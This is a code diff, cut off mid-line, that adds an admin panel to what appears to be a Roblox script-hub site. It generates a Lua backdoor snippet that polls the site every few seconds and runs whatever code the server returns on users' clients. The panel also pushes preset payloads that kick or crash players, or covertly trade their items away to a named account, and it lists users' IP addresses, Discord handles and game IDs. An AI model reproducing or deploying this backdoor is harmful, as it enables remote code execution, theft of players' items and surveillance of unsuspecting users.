@@ -1,1530 +1,1392 @@
 'use client';
 import { useState, useEffect, useMemo } from 'react';
+import Editor from '@monaco-editor/react';
+import { supabase } from '@/lib/supabase';
 
-// ─── MOCK EDITOR SHIM (replace with real Monaco in Next.js) ─────────────────
-const Editor = ({ value, onChange, height }) => (
-  <textarea
-    value={value}
-    onChange={(e) => onChange && onChange(e.target.value)}
-    style={{ height, width: '100%', background: '#0d0f14', color: '#e2e8f0', border: 'none', resize: 'none', padding: '12px', fontFamily: 'monospace', fontSize: 12, outline: 'none', borderRadius: 0 }}
-  />
-);
+export default function AdminPage() {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [passwordInput, setPasswordInput] = useState('');
+  const [isLoggingIn, setIsLoggingIn] = useState(false);
+  const [activeTab, setActiveTab] = useState('custom_home'); // 'scripts' | 'backdoor' | 'custom_home' | 'user_logs' | 'settings'
+  
+  const [scripts, setScripts] = useState([]);
+  const [selectedScript, setSelectedScript] = useState(null);
+  const [code, setCode] = useState('');
+  const [slug, setSlug] = useState('');
+  const [title, setTitle] = useState('');
+  const [status, setStatus] = useState('working');
+  const [searchQuery, setSearchQuery] = useState('');
+  const [statusFilter, setStatusFilter] = useState('all');
 
-// ─── ICONS ───────────────────────────────────────────────────────────────────
-const Icon = {
-  Shield: () => (
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-    </svg>
-  ),
-  Code: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
-    </svg>
-  ),
-  Zap: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
-    </svg>
-  ),
-  Users: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/>
-      <path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>
-    </svg>
-  ),
-  Settings: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <circle cx="12" cy="12" r="3"/>
-      <path d="M19.07 4.93l-1.41 1.41M4.93 4.93l1.41 1.41M20 12h-2M4 12H2M19.07 19.07l-1.41-1.41M4.93 19.07l1.41-1.41M12 20v-2M12 4V2"/>
-    </svg>
-  ),
-  Home: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>
-    </svg>
-  ),
-  Copy: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
-    </svg>
-  ),
-  Check: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <polyline points="20 6 9 17 4 12"/>
-    </svg>
-  ),
-  Trash: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/>
-    </svg>
-  ),
-  Plus: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
-    </svg>
-  ),
-  X: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
-    </svg>
-  ),
-  LogOut: () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/>
-    </svg>
-  ),
-  Target: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/>
-    </svg>
-  ),
-  Package: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>
-    </svg>
-  ),
-  Eye: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
-    </svg>
-  ),
-  EyeOff: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>
-    </svg>
-  ),
-  RefreshCw: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/>
-      <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
-    </svg>
-  ),
-  Menu: () => (
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/>
-    </svg>
-  ),
-  ChevronRight: () => (
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <polyline points="9 18 15 12 9 6"/>
-    </svg>
-  ),
-};
+  const [logs, setLogs] = useState([]);
+  const [logSearchQuery, setLogSearchQuery] = useState('');
+  const [isLoadingLogs, setIsLoadingLogs] = useState(false);
+  const [copiedJoinId, setCopiedJoinId] = useState(null);
 
-// ─── MOCK DATA ────────────────────────────────────────────────────────────────
-const MOCK_SCRIPTS = [
-  { id: 1, title: 'Stand Upright Main', slug: 'su-main', content: '-- Stand Upright Main\nprint("Loaded")\n', status: 'working', created_at: new Date().toISOString() },
-  { id: 2, title: 'Auto Farm v2', slug: 'auto-farm-v2', content: '-- Auto Farm\n', status: 'working', created_at: new Date().toISOString() },
-  { id: 3, title: 'ESP Module', slug: 'esp-module', content: '-- ESP\n', status: 'updating', created_at: new Date().toISOString() },
-  { id: 4, title: 'Old Bypass', slug: 'old-bypass', content: '-- patched\n', status: 'patched', created_at: new Date().toISOString() },
-];
+  // Storage Modal State
+  const [selectedStorageLog, setSelectedStorageLog] = useState(null);
+  const [isStorageModalOpen, setIsStorageModalOpen] = useState(false);
+  const [storageTab, setStorageTab] = useState('stands'); // 'stands' | 'inventory'
+  const [copiedSlotIndex, setCopiedSlotIndex] = useState(null);
 
-const MOCK_LOGS = [
-  { id: 1, roblox_username: 'xXProPlayer99', roblox_id: '3847291', ip_address: '103.21.44.5', discord_user: 'xpro#0001', executor: 'KRNL', is_vip: false, place_id: '6456360006', job_id: 'abc123def456', created_at: new Date().toISOString(), stand_storage: JSON.stringify({ slots: [{ slot: 1, name: 'Crazy Diamond', attribute: 'Vampiric', tier: 'S+', guid: '8554099967-42d08ba', is_empty: false, raw_name: 'CrazyDiamond' }, { slot: 2, name: 'Empty', attribute: 'None', tier: '-', guid: '', is_empty: true }], spec_storage: 'Hamon' }), inventory_data: JSON.stringify([{ name: 'Rokakaka', type: 'Consumable', count: 12 }, { name: 'Stand Arrow', type: 'Evolution', count: 3 }]) },
-  { id: 2, roblox_username: 'CoolDev2024', roblox_id: '9182736', ip_address: '45.67.89.10', discord_user: 'cooldev#9999', executor: 'Synapse X', is_vip: true, place_id: null, job_id: null, created_at: new Date(Date.now() - 3600000).toISOString(), stand_storage: null, inventory_data: null },
-];
+  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); 
+  const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
+  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Executed")');
+  const [isSendingBackdoor, setIsSendingBackdoor] = useState(false);
+  const [backdoorHistory, setBackdoorHistory] = useState([]);
 
-// ─── TOKENS ───────────────────────────────────────────────────────────────────
-const T = {
-  bg: '#060810',
-  surface: '#0c0e1a',
-  surfaceAlt: '#10132a',
-  border: 'rgba(110,150,255,0.12)',
-  borderHover: 'rgba(110,150,255,0.35)',
-  accent: '#6E96FF',
-  accentGlow: 'rgba(110,150,255,0.25)',
-  accentDim: 'rgba(110,150,255,0.08)',
-  yellow: '#f5c542',
-  yellowGlow: 'rgba(245,197,66,0.2)',
-  green: '#34d399',
-  red: '#f87171',
-  purple: '#a78bfa',
-  text: '#e2e8f0',
-  textMuted: '#64748b',
-  textDim: '#334155',
-};
+  const [siteTitle, setSiteTitle] = useState('LURIX HUB');
+  const [badgeText, setBadgeText] = useState('Online & Active');
+  const [supportedGames, setSupportedGames] = useState([
+    { name: 'Stand Upright', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }
+  ]);
+  const [loaderScript, setLoaderScript] = useState('');
+  const [currentKey, setCurrentKey] = useState('');
+  const [youtubeLink, setYoutubeLink] = useState('');
+  const [discordLink, setDiscordLink] = useState('');
+  const [newAdminPass, setNewAdminPass] = useState('');
 
-// ─── CSS-IN-JS STYLES ─────────────────────────────────────────────────────────
-const css = {
-  root: {
-    minHeight: '100vh',
-    background: T.bg,
-    color: T.text,
-    fontFamily: "'Inter', 'SF Pro Display', -apple-system, sans-serif",
-    WebkitFontSmoothing: 'antialiased',
-    overflowX: 'hidden',
-  },
-  // Glowing grid background
-  gridBg: {
-    position: 'fixed',
-    inset: 0,
-    backgroundImage: `
-      linear-gradient(rgba(110,150,255,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(110,150,255,0.03) 1px, transparent 1px)
-    `,
-    backgroundSize: '40px 40px',
-    pointerEvents: 'none',
-    zIndex: 0,
-  },
-  gradientOrb: (color, x, y, size = 400) => ({
-    position: 'fixed',
-    left: x, top: y,
-    width: size, height: size,
-    background: `radial-gradient(circle, ${color} 0%, transparent 70%)`,
-    pointerEvents: 'none',
-    zIndex: 0,
-    filter: 'blur(60px)',
-  }),
-  layout: {
-    position: 'relative',
-    zIndex: 1,
-    maxWidth: 1440,
-    margin: '0 auto',
-    display: 'flex',
-    minHeight: '100vh',
-  },
-  // Sidebar
-  sidebar: (collapsed) => ({
-    width: collapsed ? 64 : 240,
-    minWidth: collapsed ? 64 : 240,
-    background: T.surface,
-    borderRight: `1px solid ${T.border}`,
-    display: 'flex',
-    flexDirection: 'column',
-    transition: 'width 0.25s cubic-bezier(0.4,0,0.2,1), min-width 0.25s cubic-bezier(0.4,0,0.2,1)',
-    overflow: 'hidden',
-    position: 'sticky',
-    top: 0,
-    height: '100vh',
-  }),
-  sidebarLogo: {
-    padding: '20px 16px',
-    borderBottom: `1px solid ${T.border}`,
-    display: 'flex',
-    alignItems: 'center',
-    gap: 12,
-    minHeight: 64,
-  },
-  logoIcon: {
-    width: 36,
-    height: 36,
-    minWidth: 36,
-    background: `linear-gradient(135deg, ${T.accent}, #4a6cf7)`,
-    borderRadius: 10,
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-    fontWeight: 900,
-    fontSize: 14,
-    color: '#fff',
-    boxShadow: `0 0 20px ${T.accentGlow}`,
-  },
-  logoText: {
-    fontWeight: 900,
-    fontSize: 15,
-    letterSpacing: '0.08em',
-    color: T.text,
-    whiteSpace: 'nowrap',
-    overflow: 'hidden',
-  },
-  navItem: (active) => ({
-    display: 'flex',
-    alignItems: 'center',
-    gap: 12,
-    padding: '10px 16px',
-    margin: '2px 8px',
-    borderRadius: 10,
-    cursor: 'pointer',
-    transition: 'all 0.15s',
-    background: active ? `linear-gradient(135deg, ${T.accentDim}, rgba(74,108,247,0.08))` : 'transparent',
-    border: `1px solid ${active ? T.borderHover : 'transparent'}`,
-    color: active ? T.accent : T.textMuted,
-    fontWeight: active ? 700 : 500,
-    fontSize: 13,
-    whiteSpace: 'nowrap',
-    overflow: 'hidden',
-    position: 'relative',
-  }),
-  navIcon: {
-    minWidth: 32,
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-  },
-  // Main content
-  main: {
-    flex: 1,
-    display: 'flex',
-    flexDirection: 'column',
-    minWidth: 0,
-    overflow: 'hidden',
-  },
-  topbar: {
-    height: 64,
-    background: `${T.surface}cc`,
-    backdropFilter: 'blur(20px)',
-    WebkitBackdropFilter: 'blur(20px)',
-    borderBottom: `1px solid ${T.border}`,
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'space-between',
-    padding: '0 24px',
-    position: 'sticky',
-    top: 0,
-    zIndex: 50,
-  },
-  content: {
-    padding: '24px',
-    flex: 1,
-    overflowY: 'auto',
-  },
-  // Cards
-  card: (glow) => ({
-    background: T.surface,
-    border: `1px solid ${glow ? T.borderHover : T.border}`,
-    borderRadius: 16,
-    overflow: 'hidden',
-    boxShadow: glow ? `0 0 30px ${T.accentGlow}` : '0 4px 24px rgba(0,0,0,0.4)',
-  }),
-  cardInner: {
-    padding: '20px 24px',
-  },
-  cardHeader: {
-    padding: '16px 20px',
-    borderBottom: `1px solid ${T.border}`,
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'space-between',
-  },
-  cardLabel: {
-    fontSize: 11,
-    fontWeight: 800,
-    letterSpacing: '0.1em',
-    color: T.textMuted,
-    textTransform: 'uppercase',
-  },
-  // Stat cards
-  statCard: (color) => ({
-    background: T.surface,
-    border: `1px solid ${color}22`,
-    borderRadius: 14,
-    padding: '16px 20px',
-    position: 'relative',
-    overflow: 'hidden',
-  }),
-  statGlow: (color) => ({
-    position: 'absolute',
-    top: 0, right: 0,
-    width: 80, height: 80,
-    background: `radial-gradient(circle, ${color}33 0%, transparent 70%)`,
-    borderRadius: '50%',
-  }),
-  // Input
-  input: {
-    width: '100%',
-    background: 'rgba(0,0,0,0.4)',
-    border: `1px solid ${T.border}`,
-    borderRadius: 10,
-    padding: '10px 14px',
-    color: T.text,
-    fontSize: 13,
-    outline: 'none',
-    fontFamily: 'inherit',
-    transition: 'border-color 0.15s',
-    boxSizing: 'border-box',
-  },
-  // Buttons
-  btn: (variant = 'primary') => {
-    const v = {
-      primary: { bg: T.accent, color: '#000', shadow: `0 0 20px ${T.accentGlow}` },
-      secondary: { bg: T.accentDim, color: T.accent, shadow: 'none', border: `1px solid ${T.borderHover}` },
-      danger: { bg: 'rgba(248,113,113,0.1)', color: T.red, shadow: 'none', border: '1px solid rgba(248,113,113,0.3)' },
-      yellow: { bg: T.yellowGlow, color: T.yellow, shadow: 'none', border: `1px solid rgba(245,197,66,0.3)` },
-      ghost: { bg: 'transparent', color: T.textMuted, shadow: 'none', border: `1px solid ${T.border}` },
-      purple: { bg: 'rgba(167,139,250,0.1)', color: T.purple, shadow: 'none', border: '1px solid rgba(167,139,250,0.3)' },
-      green: { bg: 'rgba(52,211,153,0.1)', color: T.green, shadow: 'none', border: '1px solid rgba(52,211,153,0.3)' },
-    }[variant];
-    return {
-      display: 'inline-flex',
-      alignItems: 'center',
-      gap: 6,
-      padding: '9px 16px',
-      borderRadius: 10,
-      fontWeight: 700,
-      fontSize: 12,
-      cursor: 'pointer',
-      background: v.bg,
-      color: v.color,
-      boxShadow: v.shadow,
-      border: v.border || 'none',
-      transition: 'all 0.15s',
-      whiteSpace: 'nowrap',
-      letterSpacing: '0.02em',
-    };
-  },
-  // Badge
-  badge: (color) => ({
-    display: 'inline-flex',
-    alignItems: 'center',
-    gap: 4,
-    padding: '3px 9px',
-    borderRadius: 999,
-    fontSize: 10,
-    fontWeight: 800,
-    letterSpacing: '0.06em',
-    textTransform: 'uppercase',
-    background: `${color}18`,
-    color: color,
-    border: `1px solid ${color}33`,
-  }),
-  // Table
-  table: {
-    width: '100%',
-    borderCollapse: 'collapse',
-    fontSize: 12,
-  },
-  th: {
-    padding: '11px 14px',
-    textAlign: 'left',
-    fontSize: 10,
-    fontWeight: 800,
-    letterSpacing: '0.08em',
-    color: T.textMuted,
-    textTransform: 'uppercase',
-    borderBottom: `1px solid ${T.border}`,
-    background: `${T.surfaceAlt}99`,
-    whiteSpace: 'nowrap',
-  },
-  td: {
-    padding: '12px 14px',
-    borderBottom: `1px solid ${T.border}`,
-    verticalAlign: 'middle',
-  },
-  // Script list item
-  scriptItem: (active) => ({
-    padding: '12px 14px',
-    borderRadius: 12,
-    cursor: 'pointer',
-    border: `1px solid ${active ? T.borderHover : T.border}`,
-    background: active ? T.accentDim : 'rgba(0,0,0,0.2)',
-    transition: 'all 0.15s',
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'space-between',
-    gap: 8,
-  }),
-  // Modal overlay
-  overlay: {
-    position: 'fixed',
-    inset: 0,
-    background: 'rgba(0,0,0,0.85)',
-    backdropFilter: 'blur(12px)',
-    WebkitBackdropFilter: 'blur(12px)',
-    zIndex: 9999,
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-    padding: 16,
-  },
-  modal: {
-    background: T.surface,
-    border: `1px solid ${T.borderHover}`,
-    borderRadius: 20,
-    width: '100%',
-    maxWidth: 680,
-    maxHeight: '88vh',
-    display: 'flex',
-    flexDirection: 'column',
-    boxShadow: `0 0 60px ${T.accentGlow}`,
-    overflow: 'hidden',
-  },
-};
+  // UI States
+  const [copiedLoader, setCopiedLoader] = useState(false);
+  const [copiedBackdoorSnippet, setCopiedBackdoorSnippet] = useState(false);
+  const [isSaving, setIsSaving] = useState(false);
 
-// ─── HELPERS ──────────────────────────────────────────────────────────────────
-const statusColor = (s) => ({
-  working: T.green,
-  updating: T.yellow,
-  patched: T.red,
-}[s] || T.textMuted);
-
-const statusLabel = (s) => ({
-  working: 'Active',
-  updating: 'Update',
-  patched: 'Patched',
-}[s] || s);
-
-const tierColor = (tier) => ({
-  'S+': T.yellow, 'GOD': T.yellow,
-  'S': T.purple,
-  'A': T.accent,
-  'B': T.green,
-}[String(tier).toUpperCase()] || T.textMuted);
-
-const CopyBtn = ({ text, label = 'Copy', labelCopied = 'Copied!', variant = 'secondary', small }) => {
-  const [copied, setCopied] = useState(false);
-  const copy = () => {
-    navigator.clipboard.writeText(text);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
-  };
-  return (
-    <button
-      onClick={copy}
-      style={{ ...css.btn(copied ? 'green' : variant), padding: small ? '6px 12px' : undefined, fontSize: small ? 11 : undefined }}
-    >
-      {copied ? <Icon.Check /> : <Icon.Copy />}
-      {copied ? labelCopied : label}
-    </button>
-  );
-};
-
-const Divider = ({ style }) => <div style={{ height: 1, background: T.border, ...style }} />;
-
-const SectionTitle = ({ children, accent }) => (
-  <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 20 }}>
-    <div style={{ width: 3, height: 20, background: accent || `linear-gradient(180deg, ${T.accent}, #4a6cf7)`, borderRadius: 2 }} />
-    <span style={{ fontWeight: 800, fontSize: 13, letterSpacing: '0.06em', textTransform: 'uppercase', color: T.text }}>
-      {children}
-    </span>
-  </div>
-);
-
-// ─── LOGIN PAGE ───────────────────────────────────────────────────────────────
-const LoginPage = ({ onLogin }) => {
-  const [pw, setPw] = useState('');
-  const [show, setShow] = useState(false);
-  const [loading, setLoading] = useState(false);
-
-  const submit = async (e) => {
+  const handleLogin = async (e) => {
     e.preventDefault();
-    setLoading(true);
-    await new Promise(r => setTimeout(r, 800));
-    if (pw === 'admin') { onLogin(pw); }
-    else { alert('Wrong password.'); }
-    setLoading(false);
+    if (!passwordInput) return;
+    setIsLoggingIn(true);
+
+    try {
+      const res = await fetch('/api/admin/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password: passwordInput }),
+      });
+
+      const data = await res.json();
+
+      if (res.ok && data.success) {
+        setIsAuthenticated(true);
+        loadAdminData();
+        loadLogsData();
+        loadBackdoorHistory();
+      } else {
+        alert(data.message || 'Invalid admin password.');
+      }
+    } catch (err) {
+      alert('API connection error: ' + err.message);
+    } finally {
+      setIsLoggingIn(false);
+    }
   };
 
+  const loadAdminData = async () => {
+    const { data: scriptsData } = await supabase.from('scripts').select('*').order('created_at', { ascending: false });
+    if (scriptsData) {
+      setScripts(scriptsData);
+      if (scriptsData.length > 0 && !selectedScript) {
+        selectScriptHandler(scriptsData[0]);
+      }
+    }
+
+    const { data: settingsData } = await supabase.from('settings').select('*');
+    if (settingsData) {
+      settingsData.forEach(item => {
+        if (item.key === 'site_title') setSiteTitle(item.value || 'LURIX HUB');
+        if (item.key === 'badge_text') setBadgeText(item.value || 'Online & Active');
+        if (item.key === 'supported_games') {
+          try {
+            const parsed = JSON.parse(item.value);
+            if (Array.isArray(parsed) && parsed.length > 0) setSupportedGames(parsed);
+          } catch(e) {}
+        }
+        if (item.key === 'loader_script') setLoaderScript(item.value || '');
+        if (item.key === 'current_key') setCurrentKey(item.value || '');
+        if (item.key === 'youtube_link') setYoutubeLink(item.value || 'https://www.youtube.com/@owizk');
+        if (item.key === 'discord_link') setDiscordLink(item.value || '');
+      });
+    }
+  };
+
+  const loadLogsData = async () => {
+    setIsLoadingLogs(true);
+    const { data } = await supabase.from('execution_logs').select('*').order('created_at', { ascending: false }).limit(100);
+    if (data) setLogs(data);
+    setIsLoadingLogs(false);
+  };
+
+  const loadBackdoorHistory = async () => {
+    const { data } = await supabase.from('backdoor_commands').select('*').order('created_at', { ascending: false }).limit(30);
+    if (data) setBackdoorHistory(data);
+  };
+
+  const selectScriptHandler = (script) => {
+    setSelectedScript(script);
+    setCode(script.content || '');
+    setSlug(script.slug || '');
+    setTitle(script.title || '');
+    setStatus(script.status || 'working');
+  };
+
+  const filteredScripts = useMemo(() => {
+    return scripts.filter(s => {
+      const matchesSearch = s.title?.toLowerCase().includes(searchQuery.toLowerCase()) || 
+                            s.slug?.toLowerCase().includes(searchQuery.toLowerCase());
+      const matchesStatus = statusFilter === 'all' || (s.status || 'working') === statusFilter;
+      return matchesSearch && matchesStatus;
+    });
+  }, [scripts, searchQuery, statusFilter]);
+
+  const filteredLogs = useMemo(() => {
+    return logs.filter(l => {
+      const q = logSearchQuery.toLowerCase().trim();
+      if (!q) return true;
+      return (
+        l.roblox_username?.toLowerCase().includes(q) ||
+        l.ip_address?.toLowerCase().includes(q) ||
+        l.discord_user?.toLowerCase().includes(q) ||
+        l.roblox_id?.toLowerCase().includes(q)
+      );
+    });
+  }, [logs, logSearchQuery]);
+
+  const getScriptLoadstring = (scriptSlug) => {
+    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
+    return `loadstring(game:HttpGet("${domain}/api/raw/${scriptSlug}"))()`;
+  };
+
+  const getBackdoorLuaSnippet = () => {
+    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
+    return `-- [Lurix Hub] Advanced Remote Loadstring Backdoor Engine
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+
+    while task.wait(4) do
+        pcall(function()
+            if not LocalPlayer then return end
+            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(LocalPlayer.Name)
+            local res = requestFunc({ Url = url, Method = "GET" })
+            if res and res.Body and #res.Body > 0 then
+                local func, err = loadstring(res.Body)
+                if func then
+                    task.spawn(func)
+                end
+            end
+        end)
+    end
+end)`;
+  };
+
+  const handleCopyLoader = (scriptSlug) => {
+    navigator.clipboard.writeText(getScriptLoadstring(scriptSlug));
+    setCopiedLoader(true);
+    setTimeout(() => setCopiedLoader(false), 2000);
+  };
+
+  const handleCopyBackdoorSnippet = () => {
+    navigator.clipboard.writeText(getBackdoorLuaSnippet());
+    setCopiedBackdoorSnippet(true);
+    setTimeout(() => setCopiedBackdoorSnippet(false), 2000);
+  };
+
+  const handleCopyJoinScript = async (log) => {
+    if (!log.place_id || !log.job_id) return;
+    const script = `game:GetService("TeleportService"):TeleportToPlaceInstance(${log.place_id}, "${log.job_id}", game.Players.LocalPlayer)`;
+    try {
+      await navigator.clipboard.writeText(script);
+      setCopiedJoinId(log.id);
+      setTimeout(() => setCopiedJoinId(null), 2000);
+    } catch (err) {
+      console.error('Copy join script error:', err);
+    }
+  };
+
+  const handleOpenStorageModal = (log) => {
+    setSelectedStorageLog(log);
+    setStorageTab('stands');
+    setIsStorageModalOpen(true);
+  };
+
+  const handleSendBackdoor = async () => {
+    if (!backdoorLuaPayload.trim()) return alert('Please enter a Lua payload.');
+    setIsSendingBackdoor(true);
+
+    try {
+      const res = await fetch('/api/backdoor', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          adminPassword: passwordInput,
+          targetType: backdoorTargetType,
+          targetValue: backdoorTargetValue,
+          payloadLua: backdoorLuaPayload
+        })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        alert(data.message);
+        loadBackdoorHistory();
+      } else {
+        alert('Error: ' + data.message);
+      }
+    } catch (err) {
+      alert('Command error: ' + err.message);
+    } finally {
+      setIsSendingBackdoor(false);
+    }
+  };
+
+  const setPresetPayload = (type) => {
+    if (type === 'kick') {
+      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("an admin changed your data")`);
+    } else if (type === 'crash') {
+      setBackdoorLuaPayload(`while true do end`);
+    } else if (type === 'notification') {
+      setBackdoorLuaPayload(`game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "LURIX HUB ADMIN",
+    Text = "Administrator is watching your session!",
+    Duration = 10
+})`);
+    } else if (type === 'trade') {
+      setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "mhauiw29" 
+local AUTO_SEND_DELAY = 3                 
+local AUTO_ACCEPT = false                  
+
+local ADD_STANDS = false  
+local ADD_ITEMS = true    
+
+local MAX_ITEM_SLOTS = 4       
+local MAX_AMOUNT_PER_ITEM = 0  
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local UICMDS = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UICMDS")
+local TradeComm = ReplicatedStorage:WaitForChild("TradeEvents"):WaitForChild("TradeComm")
+
+PlayerGui.ChildAdded:Connect(function(child)
+    if child.Name == "TradeUI" or child.Name == "TradeRequest" then
+        task.wait()
+        if child:IsA("ScreenGui") then
+            child.Enabled = false 
+        end
+        local bg = child:FindFirstChild("Background")
+        if bg then
+            bg.Visible = false
+        end
+    end
+end)
+
+local isTrading = false
+
+TradeComm.OnClientEvent:Connect(function(action, data)
+    if action == "ShowUI" then
+        isTrading = true
+
+        local myStands = (data and data.ItemData and data.ItemData.Stands) or {}
+        local myItems = (data and data.ItemData and data.ItemData.Items) or {}
+        
+        if ADD_STANDS then
+            for _, standData in pairs(myStands) do
+                local standName = standData.Stand
+                local attribute = standData.Attribute
+                local guid = standData.GUID
+                
+                if standName and standName ~= "None" and attribute and attribute ~= "None" then
+                    TradeComm:FireServer("AddStand", {
+                        ["GUID"] = guid,
+                        ["StandName"] = standName,
+                        ["Attribute"] = attribute
+                    })
+                    task.wait(0.2)
+                end
+            end
+        end
+        
+        if ADD_ITEMS then
+            local itemCount = 0
+            for itemName, amount in pairs(myItems) do
+                
